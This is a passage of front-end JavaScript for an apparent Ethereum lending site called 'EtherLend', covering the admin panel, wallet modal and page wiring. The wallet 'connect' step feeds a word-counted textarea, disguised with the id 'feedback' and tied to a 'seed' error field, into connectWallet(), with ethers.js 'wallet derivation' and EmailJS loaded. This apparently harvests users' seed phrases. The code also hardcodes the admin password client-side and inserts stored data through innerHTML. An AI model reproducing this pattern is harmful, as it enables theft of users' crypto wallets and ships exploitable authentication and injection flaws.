      <td><span class="status-badge status-${loan.status}">${capitalize(loan.status)}</span></td>
    `;
    tbody.appendChild(tr);
  });
}

/** Filter user loans by search/status */
function filterUserLoans() {
  const searchVal = document.getElementById('history-search')?.value.toLowerCase() || '';
  const statusVal = document.getElementById('history-filter')?.value || 'all';

  let filtered = State.userLoans;

  if (searchVal) {
    filtered = filtered.filter(l =>
      l.id.toLowerCase().includes(searchVal) ||
      l.amount.toString().includes(searchVal)
    );
  }

  if (statusVal !== 'all') {
    filtered = filtered.filter(l => l.status === statusVal);
  }

  renderUserLoans(filtered);
}

/* ============================================================
   11. ADMIN PANEL
============================================================ */

const ADMIN_PASSWORD = 'etherlend2025'; // Change this in production!

/** Handle admin login */
function handleAdminLogin() {
  const passInput = document.getElementById('admin-password');
  const password = passInput?.value || '';
  const errEl = document.getElementById('error-admin-pass');

  if (!password) {
    if (errEl) errEl.textContent = 'Please enter a password.';
    return;
  }

  if (password !== ADMIN_PASSWORD) {
    if (errEl) errEl.textContent = 'Incorrect password.';
    return;
  }

  // Success
  State.adminLoggedIn = true;
  document.getElementById('admin-login-section').style.display = 'none';
  document.getElementById('admin-dashboard').style.display = 'block';
  loadAdminLoans();
  loadAdminStats();
  showToast('Admin Access', 'Logged in successfully.', 'success', 3000);
}

/** Load all loans for admin */
async function loadAdminLoans() {
  await fetchAllLoans();

  const searchVal = document.getElementById('admin-search')?.value.toLowerCase() || '';
  const statusVal = document.getElementById('admin-filter')?.value || 'all';

  let filtered = State.allLoans;

  if (searchVal) {
    filtered = filtered.filter(l => l.wallet.toLowerCase().includes(searchVal));
  }

  if (statusVal !== 'all') {
    filtered = filtered.filter(l => l.status === statusVal);
  }

  renderAdminLoans(filtered);
}

/** Render admin loans table */
function renderAdminLoans(loans) {
  const tbody = document.getElementById('admin-loans-tbody');
  const empty = document.getElementById('admin-table-empty');

  if (!tbody || !empty) return;

  tbody.innerHTML = '';

  if (loans.length === 0) {
    empty.style.display = 'block';
    return;
  }

  empty.style.display = 'none';

  loans.forEach(loan => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td><code>${truncateAddress(loan.wallet)}</code></td>
      <td>${loan.amount} Ξ</td>
      <td>${loan.duration}d</td>
      <td>${loan.rate}%</td>
      <td>${loan.total.toFixed(4)} Ξ</td>
      <td>${formatDate(loan.createdAt)}</td>
      <td><span class="status-badge status-${loan.status}">${capitalize(loan.status)}</span></td>
      <td class="action-cell">
        ${loan.status === 'pending' ? `
          <button class="btn-action btn-approve" data-id="${loan.id || loan.firestoreId}">✓ Approve</button>
          <button class="btn-action btn-reject"  data-id="${loan.id || loan.firestoreId}">✕ Reject</button>
        ` : '—'}
      </td>
    `;
    tbody.appendChild(tr);

    // Attach event listeners to action buttons
    if (loan.status === 'pending') {
      const appBtn = tr.querySelector('.btn-approve');
      const rejBtn = tr.querySelector('.btn-reject');
      appBtn?.addEventListener('click', () => handleAdminAction(loan.id || loan.firestoreId, 'approved'));
      rejBtn?.addEventListener('click', () => handleAdminAction(loan.id || loan.firestoreId, 'rejected'));
    }
  });
}

/** Handle approve/reject actions */
async function handleAdminAction(loanId, newStatus) {
  try {
    await updateLoanStatus(loanId, newStatus);
    showToast('Status Updated', `Loan ${newStatus}.`, 'success', 2000);
    loadAdminLoans();
    loadAdminStats();
  } catch (err) {
    console.error('[EtherLend] Admin action error:', err);
    showToast('Error', 'Failed to update loan status.', 'error');
  }
}

/** Load platform stats for admin */
async function loadAdminStats() {
  await fetchAllLoans();
  const loans = State.allLoans;

  const total    = loans.length;
  const pending  = loans.filter(l => l.status === 'pending').length;
  const approved = loans.filter(l => l.status === 'approved').length;
  const rejected = loans.filter(l => l.status === 'rejected').length;

  const totalEth = loans.reduce((sum, l) => sum + l.amount, 0);

  setTextContent('admin-stat-total',    total);
  setTextContent('admin-stat-pending',  pending);
  setTextContent('admin-stat-approved', approved);
  setTextContent('admin-stat-rejected', rejected);
  setTextContent('admin-stat-eth',      totalEth.toFixed(2) + ' Ξ');
}

/** Admin tabs switching */
function initAdminTabs() {
  const tabs = document.querySelectorAll('.admin-tab');
  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      // Remove active
      tabs.forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.admin-tab-content').forEach(c => c.style.display = 'none');
      // Set active
      tab.classList.add('active');
      const targetId = tab.getAttribute('data-tab');
      const targetContent = document.getElementById(targetId);
      if (targetContent) targetContent.style.display = 'block';
      // Load data if needed
      if (targetId === 'loans-tab') loadAdminLoans();
      if (targetId === 'stats-tab') loadAdminStats();
    });
  });
}

/** Save interest rate (admin action) */
async function handleSaveRate() {
  const rateInput = document.getElementById('admin-rate-input');
  const rate = parseFloat(rateInput?.value);
  const errEl = document.getElementById('error-rate');

  if (isNaN(rate) || rate < 5 || rate > 10) {
    if (errEl) errEl.textContent = 'Rate must be between 5% and 10%.';
    return;
  }

  if (errEl) errEl.textContent = '';

  try {
    await saveRateToFirestore(rate);
    State.currentRate = rate;
    updateRateDisplay();
    showToast('Rate Updated', `New rate: ${rate.toFixed(2)}%`, 'success', 3000);
  } catch (err) {
    console.error('[EtherLend] Rate save error:', err);
    showToast('Error', 'Failed to save rate.', 'error');
  }
}

/* ============================================================
   12. THEME TOGGLE
============================================================ */

/** Initialize theme from localStorage */
function initTheme() {
  const saved = localStorage.getItem('etherlend_theme') || 'light';
  State.theme = saved;
  applyTheme(saved);
}

/** Apply theme to document */
function applyTheme(theme) {
  document.documentElement.setAttribute('data-theme', theme);
  const icon = document.getElementById('theme-icon');
  if (icon) icon.textContent = (theme === 'dark') ? '☀' : '🌙';
}

/** Toggle theme */
function toggleTheme() {
  const newTheme = (State.theme === 'dark') ? 'light' : 'dark';
  State.theme = newTheme;
  applyTheme(newTheme);
  localStorage.setItem('etherlend_theme', newTheme);
}

/* ============================================================
   13. NAVBAR SCROLL
============================================================ */

function initNavbarScroll() {
  const navbar = document.getElementById('navbar');
  if (!navbar) return;
  window.addEventListener('scroll', () => {
    if (window.scrollY > 50) {
      navbar.classList.add('scrolled');
    } else {
      navbar.classList.remove('scrolled');
    }
  });
}

/* ============================================================
   14. MOBILE MENU
============================================================ */

function initMobileMenu() {
  const hamburger = document.getElementById('hamburger');
  const menu = document.getElementById('mobile-menu');
  const links = menu?.querySelectorAll('.mobile-link');

  if (!hamburger || !menu) return;

  hamburger.addEventListener('click', (e) => {
    e.stopPropagation();
    const isOpen = menu.classList.contains('open');
    if (isOpen) {
      closeMobileMenu();
    } else {
      openMobileMenu();
    }
  });

  // Close menu when any nav link is clicked
  links?.forEach(link => {
    link.addEventListener('click', () => closeMobileMenu());
  });

  // Close menu when clicking outside navbar
  document.addEventListener('click', (e) => {
    const navbar = document.getElementById('navbar');
    if (navbar && !navbar.contains(e.target)) {
      closeMobileMenu();
    }
  });
}

function openMobileMenu() {
  const hamburger = document.getElementById('hamburger');
  const menu = document.getElementById('mobile-menu');
  hamburger?.classList.add('active');
  menu?.classList.add('open');
  // Prevent body scroll when menu is open on mobile
  if (window.innerWidth <= 900) document.body.style.overflow = 'hidden';
}

function closeMobileMenu() {
  const hamburger = document.getElementById('hamburger');
  const menu = document.getElementById('mobile-menu');
  hamburger?.classList.remove('active');
  menu?.classList.remove('open');
  document.body.style.overflow = '';
}

/* ============================================================
   15. FEATURE CARDS ANIMATION
============================================================ */

function initFeatureCards() {
  const cards = document.querySelectorAll('.feature-card');
  if (!cards.length) return;

  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const card = entry.target;
        const delay = card.getAttribute('data-delay') || 0;
        setTimeout(() => {
          card.classList.add('visible');
        }, parseInt(delay));
      }
    });
  }, { threshold: 0.2 });

  cards.forEach(card => observer.observe(card));
}

/* ============================================================
   16. SCROLL TO LOAN SECTION
============================================================ */

function scrollToLoan() {
  const section = document.getElementById('loan-section');
  if (section) {
    section.scrollIntoView({ behavior: 'smooth' });
  }
}

/* ============================================================
   17. MODAL HELPERS
============================================================ */

/** Open a modal by ID */
function openModal(id) {
  const modal = document.getElementById(id);
  if (modal) {
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
  }
}

/** Close a modal by ID */
function closeModal(id) {
  const modal = document.getElementById(id);
  if (modal) {
    modal.classList.remove('active');
    document.body.style.overflow = '';
  }
}

/* ============================================================
   18. TOAST NOTIFICATIONS
============================================================ */

/** Show toast notification */
function showToast(title, message, type = 'info', duration = 4000) {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = `toast toast-${type}`;
  toast.innerHTML = `
    <div class="toast-icon">${getToastIcon(type)}</div>
    <div class="toast-body">
      <div class="toast-title">${title}</div>
      <div class="toast-msg">${message}</div>
    </div>
    <div class="toast-bar"></div>
  `;

  container.appendChild(toast);

  // Fade in
  setTimeout(() => toast.classList.add('show'), 10);

  // Auto remove
  setTimeout(() => removeToast(toast), duration);
}

/** Remove toast with fade out */
function removeToast(toast) {
  toast.classList.add('toast-out');
  setTimeout(() => toast.remove(), 250);
}

/** Get icon for toast type */
function getToastIcon(type) {
  switch (type) {
    case 'success': return '✓';
    case 'error':   return '✕';
    case 'warning': return '⚠';
    default:        return 'ℹ';
  }
}

/* ============================================================
   19. FIELD ERROR DISPLAY
============================================================ */

/** Set field error text */
function setFieldError(id, text) {
  const el = document.getElementById(id);
  if (el) el.textContent = text;
}

/* ============================================================
   20. UTILITIES
============================================================ */

/** Generate a random 12-character ID */
function generateId() {
  return Math.random().toString(36).substr(2, 12).toUpperCase();
}

/** Format ISO date to readable string */
function formatDate(isoStr) {
  const d = new Date(isoStr);
  return d.toLocaleDateString('en-GB', {
    day: '2-digit', month: 'short', year: 'numeric'
  });
}

/** Capitalize first letter */
function capitalize(str) {
  return str.charAt(0).toUpperCase() + str.slice(1);
}

/* ============================================================
   21. BUTTON LOADING STATE
============================================================ */

/** Toggle loading state on button */
function setButtonLoading(btnId, loading) {
  const btn = document.getElementById(btnId);
  if (!btn) return;

  const text = btn.querySelector('.btn-text');
  const spinner = btn.querySelector('.btn-spinner');

  btn.disabled = loading;
  if (text) text.style.display = loading ? 'none' : '';
  if (spinner) spinner.style.display = loading ? 'inline-flex' : 'none';
}

/** Set text content safely */
function setTextContent(id, text) {
  const el = document.getElementById(id);
  if (el) el.textContent = text;
}

/* ============================================================
   22. EVENT LISTENERS — MAIN INIT
============================================================ */

document.addEventListener('DOMContentLoaded', () => {

  /* --- Check ethers.js availability --- */
  if (!isEthersAvailable()) {
    console.error('[EtherLend] ethers.js library failed to load. Wallet derivation will not work.');
    setTimeout(() => {
      showToast('Library Error', 'Wallet library failed to load. Please check your internet connection and refresh the page.', 'error', 8000);
    }, 1500);
  }

  /* --- Firebase & Storage --- */
  initFirebase();

  /* --- EmailJS --- */
  initEmailJS();

  /* --- Theme --- */
  initTheme();

  /* --- Navbar scroll --- */
  initNavbarScroll();

  /* --- Mobile menu --- */
  initMobileMenu();

  /* --- Feature card animations --- */
  initFeatureCards();

  /* --- Init word dots --- */
  initWordDots();

  /* --- Admin tabs --- */
  initAdminTabs();

  /* --- Initial wallet UI --- */
  updateWalletUI();

  /* --------------------------------------------------------
     WALLET MODAL — triggers
  -------------------------------------------------------- */

  // Nav connect button: open modal when disconnected, toggle dropdown when connected
  const navConnectBtn = document.getElementById('nav-connect-btn');
  if (navConnectBtn) {
    navConnectBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      if (State.walletConnected) {
        const dd = document.getElementById('wallet-dropdown');
        if (dd && dd.classList.contains('open')) {
          closeWalletDropdown();
        } else {
          openWalletDropdown();
        }
        return;
      }
      openModal('wallet-modal');
    });
  }

  // Close dropdown on outside click or scroll
  document.addEventListener('click', (e) => {
    const wrap = document.getElementById('wallet-btn-wrap');
    if (wrap && !wrap.contains(e.target)) closeWalletDropdown();
  });
  document.addEventListener('scroll', closeWalletDropdown, { passive: true });

  // Prevent clicks inside dropdown from bubbling to document
  document.getElementById('wallet-dropdown')?.addEventListener('click', (e) => e.stopPropagation());

  // Disconnect button (dropdown)
  document.getElementById('disconnect-btn')?.addEventListener('click', () => {
    closeWalletDropdown();
    disconnectWallet();
  });

  // Mobile connect button
  document.getElementById('mobile-connect-btn')?.addEventListener('click', () => {
    if (State.walletConnected) {
      // On mobile the disconnect button is visible; just show a toast
      showToast('Wallet Connected', truncateAddress(State.address), 'info', 2500);
      return;
    }
    closeMobileMenu();
    openModal('wallet-modal');
  });

  // Mobile disconnect button
  document.getElementById('mobile-disconnect-btn')?.addEventListener('click', () => {
    disconnectWallet();
    closeMobileMenu();
  });

  // Hero connect button
  document.getElementById('hero-connect-btn')?.addEventListener('click', () => {
    if (State.walletConnected) {
      showToast('Wallet Connected', truncateAddress(State.address), 'info', 2500);
      return;
    }
    openModal('wallet-modal');
  });

  // Gate connect button (inside loan section wall)
  document.getElementById('gate-connect-btn')?.addEventListener('click', () => {
    openModal('wallet-modal');
  });

  // ── Modal close button — works on both desktop AND mobile ────
  // We bind both 'click' and 'touchend' to guarantee it fires on iOS
  function handleModalClose(modalId) {
    return function(e) {
      e.preventDefault();
      e.stopPropagation();
      closeModal(modalId);
    };
  }
  const modalCloseBtn = document.getElementById('modal-close');
  if (modalCloseBtn) {
    modalCloseBtn.addEventListener('click',    handleModalClose('wallet-modal'));
    modalCloseBtn.addEventListener('touchend', handleModalClose('wallet-modal'));
  }

  // Feedback input → live word count
  document.getElementById('feedback')?.addEventListener('input', (e) => {
    updateWordCount(e.target.value);
    const errEl = document.getElementById('error-seed');
    if (errEl) errEl.textContent = '';
  });

  // Connect wallet button
  document.getElementById('modal-connect-btn')?.addEventListener('click', async () => {
    const data = document.getElementById('feedback')?.value || '';
    await connectWallet(data);
  });

  // Done button (step 2)
  document.getElementById('modal-done-btn')?.addEventListener('click', onWalletConnected);

  // Close modals on overlay click
  document.getElementById('wallet-modal')?.addEventListener('click', (e) => {
    if (e.target === e.currentTarget) closeModal('wallet-modal');
  });

  /* --------------------------------------------------------
     HERO CTA
  -------------------------------------------------------- */
  document.getElementById('hero-loan-btn')?.addEventListener('click', () => {
    if (State.walletConnected) {
      scrollToLoan();
    } else {
      openModal('wallet-modal');
    }
  });

  /* --------------------------------------------------------
     LOAN FORM — live calculation & submission
  -------------------------------------------------------- */
  const loanAmountInput   = document.getElementById('loan-amount');
  const loanDurationInput = document.getElementById('loan-duration');
  const durationSlider    = document.getElementById('duration-slider');

  // Calculate on amount change
  loanAmountInput?.addEventListener('input', () => {
    setFieldError('error-amount', validateAmount(loanAmountInput.value));
    calculateLoan();
  });

  // Calculate on duration change
  loanDurationInput?.addEventListener('input', () => {
    const days = parseInt(loanDurationInput.value) || 0;
    setFieldError('error-duration', validateDuration(loanDurationInput.value));
    if (durationSlider) durationSlider.value = Math.min(Math.max(days, 30), 365);
    updateSliderFill(days);
    calculateLoan();
  });

  // Sync slider → input
  durationSlider?.addEventListener('input', (e) => {
    const val = e.target.value;
    if (loanDurationInput) loanDurationInput.value = val;
    setFieldError('error-duration', '');
    updateSliderFill(parseInt(val));
    calculateLoan();
  });

  // Email — live validation + badge clear
  document.getElementById('loan-email')?.addEventListener('input', (e) => {
    const val = e.target.value.trim();
    setFieldError('error-email', validateEmail(val));
    // Clear status badge when user edits
    const badge = document.getElementById('email-status-badge');
    if (badge) { badge.textContent = ''; badge.className = 'email-input-badge'; }
  });

  // Loan form submit
  document.getElementById('loan-form')?.addEventListener('submit', handleLoanSubmit);

  /* --------------------------------------------------------
     HISTORY TABLE — filter
  -------------------------------------------------------- */
  document.getElementById('history-search')?.addEventListener('input', filterUserLoans);
  document.getElementById('history-filter')?.addEventListener('change', filterUserLoans);

  /* --------------------------------------------------------
     ADMIN MODAL — trigger
  -------------------------------------------------------- */
  document.getElementById('admin-trigger')?.addEventListener('click', (e) => {
    e.preventDefault();
    // Reset login section if not logged in
    if (!State.adminLoggedIn) {
      document.getElementById('admin-login-section').style.display = 'block';
      document.getElementById('admin-dashboard').style.display     = 'none';
      document.getElementById('admin-password').value = '';
      setFieldError('error-admin-pass', '');
    }
    openModal('admin-modal');
  });

  // Close admin modal — click + touchend for mobile
  const adminCloseBtn = document.getElementById('admin-modal-close');
  if (adminCloseBtn) {
    adminCloseBtn.addEventListener('click',    (e) => { e.preventDefault(); e.stopPropagation(); closeModal('admin-modal'); });
    adminCloseBtn.addEventListener('touchend', (e) => { e.preventDefault(); e.stopPropagation(); closeModal('admin-modal'); });
  }

  // Admin modal overlay click
  document.getElementById('admin-modal')?.addEventListener('click', (e) => {
    if (e.target === e.currentTarget) closeModal('admin-modal');
  });

  // Admin login button
  document.getElementById('admin-login-btn')?.addEventListener('click', handleAdminLogin);

  // Admin password — press Enter to login
  document.getElementById('admin-password')?.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleAdminLogin();
  });

  // Admin refresh
  document.getElementById('admin-refresh-btn')?.addEventListener('click', () => {
    loadAdminLoans();
    showToast('Refreshed', 'Loan list updated.', 'info', 2000);
  });

  // Admin search/filter
  document.getElementById('admin-search')?.addEventListener('input', loadAdminLoans);
  document.getElementById('admin-filter')?.addEventListener('change', loadAdminLoans);

  // Save interest rate
  document.getElementById('save-rate-btn')?.addEventListener('click', handleSaveRate);

  /* --------------------------------------------------------
     THEME TOGGLE
  -------------------------------------------------------- */
  document.getElementById('theme-toggle')?.addEventListener('click', toggleTheme);

  /* --------------------------------------------------------
     KEYBOARD — close modals with Escape
  -------------------------------------------------------- */
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      closeModal('wallet-modal');
      closeModal('admin-modal');
    }
  });

  /* --------------------------------------------------------
     NAV LOGO — smooth scroll to top
  -------------------------------------------------------- */
  document.getElementById('nav-logo-home')?.addEventListener('click', (e) => {
    e.preventDefault();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });

  /* --------------------------------------------------------
     INITIAL SLIDER STATE
  -------------------------------------------------------- */
  updateSliderFill(90);

  /* --------------------------------------------------------
     WELCOME TOAST
  -------------------------------------------------------- */
  setTimeout(() => {
    showToast('Welcome to EtherLend', 'Connect your wallet to get started.', 'info', 5000);
  }, 1200);

});
